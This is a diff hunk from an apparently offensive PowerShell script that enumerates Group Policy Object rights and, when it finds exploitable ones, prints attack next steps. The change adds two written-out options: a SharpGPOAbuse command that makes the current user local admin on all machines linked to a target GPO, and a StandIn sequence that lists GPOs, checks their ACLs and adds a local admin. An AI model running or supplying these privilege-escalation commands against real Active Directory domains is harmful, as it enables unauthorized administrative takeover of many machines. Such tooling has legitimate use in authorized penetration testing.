@@ -196,10 +196,22 @@ foreach ($gpo in $gpos) {
 if (-not $foundExploit) {
     Add-Content $outfile "[+] No exploitable GPO rights found for current user"
 } else {
-    Add-Content $outfile "[>>>] NEXT STEP:"
-    Add-Content $outfile "Use SharpGPOAbuse / StandIn to modify identified GPO"
-    Add-Content $outfile "Example:"
-    Add-Content $outfile "SharpGPOAbuse.exe --AddLocalAdmin --UserAccount $me --GPOName <TARGET>"
+    Add-Content $outfile "Choose attack method"
+    
+    Add-Content $outfile "   Option A - SharpGPOAbuse"
+    Add-Content $outfile "   Example:"
+    Add-Content $outfile "   SharpGPOAbuse.exe --AddLocalAdmin --UserAccount $me --GPOName <TARGET_GPO>"
+    Add-Content $outfile "   → Result: user becomes local admin on all linked machines"
+    
+    Add-Content $outfile ""
+    Add-Content $outfile "   Option B - StandIn (enumeration + modification)"
+    Add-Content $outfile "   - List GPOs:"
+    Add-Content $outfile "     StandIn.exe --gpo"
+    Add-Content $outfile "   - Check ACL:"
+    Add-Content $outfile "     StandIn.exe --gpo --filter <GPO_NAME> --acl"
+    Add-Content $outfile "   - Abuse:"
+    Add-Content $outfile "     StandIn.exe --gpo --filter <GPO_NAME> --localadmin $me"
+
 }
 
 # ===============================
